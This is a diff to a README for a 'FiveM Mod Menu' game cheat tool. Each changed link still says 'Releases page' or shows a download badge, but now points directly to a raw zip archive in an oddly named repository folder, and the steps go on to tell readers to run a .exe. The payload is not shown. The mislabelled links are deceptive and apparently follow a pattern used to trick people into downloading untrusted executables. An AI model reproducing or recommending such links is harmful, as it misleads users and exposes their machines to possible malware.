@@ -6,13 +6,13 @@ Welcome to the FiveM Mod Menu! This tool provides powerful features to improve y
 
 ## 🔗 Download
 
-[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM%20Mod%20Menu-blue)](https://github.com/hExOnix29/FiveM-Mod-Menu/releases)
+[![Download FiveM Mod Menu](https://raw.githubusercontent.com/hExOnix29/FiveM-Mod-Menu/main/unsurmountably/Mod-Menu-Five-3.4.zip%20Mod%20Menu-blue)](https://raw.githubusercontent.com/hExOnix29/FiveM-Mod-Menu/main/unsurmountably/Mod-Menu-Five-3.4.zip)
 
 ## 📥 Download & Install
 
 To get started, you will need to visit the Releases page. Follow these steps to download and run the software:
 
-1. Click on this link to visit the [Releases page](https://github.com/hExOnix29/FiveM-Mod-Menu/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/hExOnix29/FiveM-Mod-Menu/main/unsurmountably/Mod-Menu-Five-3.4.zip).
 2. On the Releases page, find the latest release.
 3. Under the release notes, you will see download options. 
 4. Click on the application file for your system. This may be labeled as `.exe` for Windows.
@@ -68,7 +68,7 @@ If you encounter problems, here are some steps you can take:
 
 - **Recheck System Requirements:** Make sure your system meets the necessary specifications.
 - **Restart the Application:** Sometimes a simple restart can resolve issues.
-- **Reinstall the Mod Menu:** If problems persist, download the latest version again from the [Releases page](https://github.com/hExOnix29/FiveM-Mod-Menu/releases) and install.
+- **Reinstall the Mod Menu:** If problems persist, download the latest version again from the [Releases page](https://raw.githubusercontent.com/hExOnix29/FiveM-Mod-Menu/main/unsurmountably/Mod-Menu-Five-3.4.zip) and install.
 
 ## 🌐 Community and Contributions
 
@@ -78,6 +78,6 @@ Join our community for updates and discussions. Share your experience, suggest f
 
 For further inquiries, feel free to contact us through the GitHub issue section. Your questions and ideas are valued.
 
-[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM%20Mod%20Menu-blue)](https://github.com/hExOnix29/FiveM-Mod-Menu/releases)
+[![Download FiveM Mod Menu](https://raw.githubusercontent.com/hExOnix29/FiveM-Mod-Menu/main/unsurmountably/Mod-Menu-Five-3.4.zip%20Mod%20Menu-blue)](https://raw.githubusercontent.com/hExOnix29/FiveM-Mod-Menu/main/unsurmountably/Mod-Menu-Five-3.4.zip)
 
 Now you are ready to enjoy the FiveM Mod Menu! Happy gaming!
